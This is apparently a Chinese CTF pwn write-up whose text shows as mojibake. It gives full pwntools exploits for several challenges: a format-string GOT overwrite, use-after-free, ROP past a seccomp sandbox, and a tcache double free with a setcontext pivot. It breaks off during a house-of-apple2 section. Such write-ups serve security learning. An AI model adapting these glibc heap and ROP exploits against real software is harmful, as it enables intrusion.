    <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>ç›´æ¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - elf.sym[<span class="hljs-string">&#x27;func&#x27;</span>]<br><br>printf_got = elfbase + elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system_plt = elfbase + elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = fmtstr_payload(<span class="hljs-number">8</span>, &#123;printf_got:system_plt&#125;,write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;hello\n&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2-1"></a>pwn2-1</h3><p>å­˜åœ¨uafï¼Œä¸”print_noteå‡½æ•°æ˜¯é€šè¿‡å¼•ç”¨å †å—ä¸Šprint_note_contentå‡½æ•°çš„åœ°å€æ¥å®ç°ï¼Œä¿®æ”¹å †ä¸Šprint_note_contentå‡½æ•°çš„åœ°å€ä¸ºmagicå‡½æ•°åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn2-1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn2-1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x11f0</span><br><br>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x10</span>, p64(elfbase + elf.sym[<span class="hljs-string">&#x27;magic&#x27;</span>]))<br>printf(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h3><p>bfè§£é‡Šå™¨ç±»å‹çš„é¢˜</p><p>é€šè¿‡è¾“å…¥çš„â€˜&gt;&lt;+-â€˜ç­‰è¿™äº›ç¬¦å·å¯ä»¥å¯¹æ ˆä¸Šv3çš„æ•°æ®è¿›è¡Œè¯»å†™ï¼Œè€Œä¸”æ²¡æœ‰å¯¹åç§»é‡è¿›è¡Œé™åˆ¶ï¼Œè¿™å°±å¯ä»¥å¯¹æ ˆä¸Šçš„ä»»æ„æ•°æ®è¯»å†™ã€‚</p><img src="/img/6/Screenshot_20221130_051449.png" style="zoom: 80%;" /><p>æ‰“å°å‡º<code>__libc_start_main</code>å‡½æ•°çš„åœ°å€ï¼Œå‡å»ç›¸åº”çš„åç§»å°±å¯å¾—åˆ°libcçš„åŸºåœ°å€ï¼Œåˆ©ç”¨libcæ‰¾åˆ°ç›¸åº”çš„gadgetï¼Œå†è¦†ç›–æ ˆä¸Š<code>__libc_start_main</code>çš„åœ°å€ï¼Œç›´æ¥ROPã€‚</p><p>ç¨‹åºå¼€å¯æ²™ç›’å¯¹readå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œäº†é™åˆ¶ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥orwè¯»å–flagæ–‡ä»¶ä¸­çš„ä¿¡æ¯ï¼Œè¿™é‡Œæ”¹ç”¨sendfileå‡½æ•°å³å¯ã€‚</p><img src="/img/6/Screenshot_20221130_053546.png" style="zoom: 80%;" /><p>â€‹</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x210</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x22</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">6</span><br>payload += (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> * <span class="hljs-number">20</span><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;\n&#x27;</span>, payload)<br><br>stack_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br><br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rcx_rbx = libcbase + <span class="hljs-number">0x10257e</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br><br><span class="hljs-comment">#open(â€˜flag&#x27;)</span><br><span class="hljs-comment">#sendfile(1,fd,0,0x100)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xa0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rcx_rbx), p64(<span class="hljs-number">0x100</span>), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">40</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>getchar(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ”¹ç”¨readvå‡½æ•°ä¹Ÿå¯ä»¥è¯»å–flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#open(&#x27;flag&#x27;)</span><br><span class="hljs-comment">#readv(3, iovec, 1)</span><br><span class="hljs-comment">#writev(1, iovec, 1)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xd0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">19</span>),<br>    p64(syscall_ret),<br>    <br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">20</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stack_addr + <span class="hljs-number">0xf0</span>) + p64(<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨closeå‡½æ•°å…ˆå…³é—­æ ‡å‡†è¾“å…¥<code>close(0)</code>ï¼Œå†ç›´æ¥orwï¼Œè¿™é‡Œå°±ä¸å†å±•ç¤ºäº†ã€‚</p><h3 id="only"><a href="#only" class="headerlink" title="only"></a>only</h3><p>æœ¬åœ°ç¯å¢ƒï¼š2.31-0ubuntu9_amd64</p><p>ç¨‹åºåœ¨å¼€å§‹æ—¶å°±å·²ç»æœ‰å¾ˆå¤šå †å—å·²ç»è¢«åˆ†é…é‡Šæ”¾äº†ï¼ˆé€šè¿‡åŠ¨æ€é“¾æ¥åº“libseccomp.so.2å¼•å…¥æ²™ç›’è§„åˆ™å¯¼è‡´çš„ï¼‰</p><img src="/img/6/Screenshot_20221201_090534.png" style="zoom: 67%;" /><p>â€‹                                                                                                      </p><p>ä½¿ç”¨increaseå‡½æ•°æ˜¯å¯¹å †å—çš„ç”³è¯·ï¼Œæ¬¡æ•°é™åˆ¶ä¸º11æ¬¡ï¼›ä½¿ç”¨decresaeå‡½æ•°æ˜¯é‡Šæ”¾å †å—ï¼Œæ¬¡æ•°é™åˆ¶ä¸º4æ¬¡ï¼Œè™½ç„¶æœ‰uafï¼Œä½†ç¨‹åºæ²¡æœ‰editå‡½æ•°å’Œshowå‡½æ•°è¿™ç§åŠŸèƒ½ï¼Œæ— æ³•å¯¹uafå®Œæˆæœ‰æ•ˆåˆ©ç”¨ï¼Œå”¯ä¸€å¯ä»¥åˆ©ç”¨çš„æ˜¯initialå‡½æ•°ï¼Œè¿˜åªèƒ½ä½¿ç”¨ä¸€æ¬¡</p><img src="/img/6/Screenshot_20221201_091349.png" style="zoom:67%;" /><p>å¦‚æœå·²ç»å®Œæˆäº†ä¸€æ¬¡å †å—çš„ç”³è¯·å¹¶ä¸”é‡Šæ”¾ï¼Œåœ¨æ­¤è¿‡ç¨‹å°±å°†tcacheä¸­çš„<code>tcache_perthread_struct *key</code>ç ´åï¼Œé…åˆuafå°±å¯ä»¥å®ç°tcacheçš„double freeã€‚ç”±äºç”³è¯·å †å—çš„å¤§å°ï¼Œé‡Šæ”¾æ¬¡æ•°è¿™äº›é™åˆ¶ï¼Œæˆ‘ä»¬æ— æ³•ä¸€æ¬¡æ€§æ³„æ¼å‡ºlibcçš„åŸºåœ°å€ã€‚</p><p>åœ¨å®Œæˆdouble freeåï¼ŒåŠ«æŒåˆ°tcacheçš„ç»“æ„ä½“å¤´éƒ¨ï¼Œå°±å¯ä»¥ç›´æ¥æ§åˆ¶tcacheçš„ç”³è¯·å’Œæ•°é‡ã€‚ç›´æ¥é‡Šæ”¾tcacheçš„ç»“æ„ä½“å¤´éƒ¨å¾—åˆ°unsorted binåï¼Œæ”»å‡»<code>_IO_2_1_stdout_</code>ä»¥å®ç°libcåŸºåœ°å€çš„æ³„æ¼ï¼š</p><img src="/img/6/Screenshot_20221201_102237.jpg" style="zoom: 67%;" /><p>â€‹</p><p>æ²™ç›’çš„å­˜åœ¨æ— æ³•ç›´æ¥æ‹¿åˆ°shellï¼Œéœ€è¦åˆ©ç”¨<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>å’ŒsetcontextåŠ«æŒrspï¼Œæ‰§è¡ŒROPæˆ–è€…shellcodeã€‚</p><p>åœ¨æ­¤è¿‡ç¨‹ä¸­éœ€è¦çˆ†ç ´ä¸¤æ¬¡åœ°å€ï¼Œæœ‰1&#x2F;256çš„æ¦‚ç‡æ‹¿åˆ°flagï¼Œåœ¨æœ¬åœ°è¿è¡Œæ—¶å¯ä»¥åŠ ä¸Š aslr&#x3D;Falseï¼ŒèŠ‚çœæœ¬åœ°çˆ†ç ´çš„æ—¶é—´ã€‚</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;only&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#p = process(&#x27;./only&#x27;, aslr=False)</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">initial</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    <span class="hljs-comment">#p.sendlineafter(b&#x27;Size:&#x27;, str(size).encode())</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">increase</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decresae</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    decresae()<br>    initial()<br>    decresae()<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x10\xc0&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p16(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">1</span>)  + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>)<br>    increase(<span class="hljs-number">0x70</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>    decresae()<br>    increase(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\xa0\x56&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x30</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>    free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    mp = libcbase + <span class="hljs-number">2011848</span><br>    magic_gadget = libcbase + <span class="hljs-number">0x1547a0</span><br>    setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>    pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>    pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c1e1</span><br>    pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>    ret = libcbase + <span class="hljs-number">0x25679</span><br>    mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>    increase(<span class="hljs-number">0x40</span>, p64(free_hook) + p64(stdout) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xd0</span>, p64(magic_gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xe0</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><br><br>    payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x140</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>    payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect) + p64(heap_addr + <span class="hljs-number">0x140</span> +<span class="hljs-number">0x70</span>)<br>    payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br>    payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p64(heap_addr + <span class="hljs-number">0x140</span> + <span class="hljs-number">0x28</span>) + p64(ret)<br><br>    increase(<span class="hljs-number">0xe0</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    decresae()<br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    <span class="hljs-keyword">try</span> :<br>        p = process(<span class="hljs-string">&#x27;./only&#x27;</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><p>â€‹                                                     </p><p>â€‹                        </p><h3 id="store"><a href="#store" class="headerlink" title="store"></a>store</h3><p>ç¨‹åºåªèƒ½ä½¿ç”¨ä¸¤æ¬¡ç”³è¯·å †å—ï¼Œè™½ç„¶åç»­ä¹Ÿèƒ½ç”³è¯·ï¼Œä½†æ— æ³•å»ä½¿ç”¨ï¼›ç•™äº†ä¸€ä¸ªuafçš„æ¼æ´ï¼Œfreeçš„æ¬¡æ•°ä¹Ÿåªèƒ½æ˜¯4æ¬¡ï¼Œeditå’Œshowè¿™ç§å‡½æ•°å¯ä»¥æ­£å¸¸ä½¿ç”¨ã€‚å¦‚æœä½¿ç”¨tcacheå»å®ç°ä»»æ„å†™ï¼Œè¿™ä¸¤æ¬¡ç”³è¯·æ˜¯è¿œè¿œä¸å¤Ÿç”¨çš„ã€‚è¿™é‡Œæ˜¯ä½¿ç”¨house of apple2ï¼Œä¸»è¦å°±æ˜¯åˆ©ç”¨ä¸€æ¬¡largebin attackæ”»å‡»å»å®ç°åŠ«æŒIOæ§åˆ¶æµã€‚</p><p>Roderickå¸ˆå‚…çš„æ–‡ç« å·²ç»å¾ˆè¯¦ç»†äº†ï¼š[<a href="https://bbs.pediy.com/thread-273832.htm">åŸåˆ›] House of apple ä¸€ç§æ–°çš„glibcä¸­IOæ”»å‡»æ–¹æ³• (2)-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com</a></p><p>â€‹</p><p>å½“ç„¶æ„é€ IO_FILEä¹Ÿéœ€è¦æ³¨æ„<code>_IO_flush_all_lockp</code>å‡½æ•°ä¸­çš„ifåˆ¤æ–­ï¼š</p><img src="/img/6/Screenshot_20230103_111938.png" style="zoom: 67%;" /><p>æ»¡è¶³å‰è€…<code>fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>ï¼Œæˆ–è€…åè€…&#96;&#96;_IO_vtable_offset (fp) &#x3D;&#x3D; 0&amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base&#96;å³å¯</p><p>â€‹</p><p>è¿›å…¥<code>_IO_wfile_overflow</code>åä¼šæœ‰rdxç›´æ¥èµ‹å€¼ä¸º<code>fp-&gt;_wide_data</code>ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é…åˆsetcontextå‡½æ•°ä½¿ç”¨</p><img src="/img/6/Screenshot_20230103_095137.jpg" style="zoom: 67%;" /><p>â€‹</p><p>é¢˜ç›®ä¸­å­˜åœ¨æ²™ç›’ï¼Œ64ä½å’Œ32çš„é™åˆ¶éƒ½æœ‰</p><img src="/img/6/Screenshot_20230103_103656.jpg" style="zoom: 67%;" 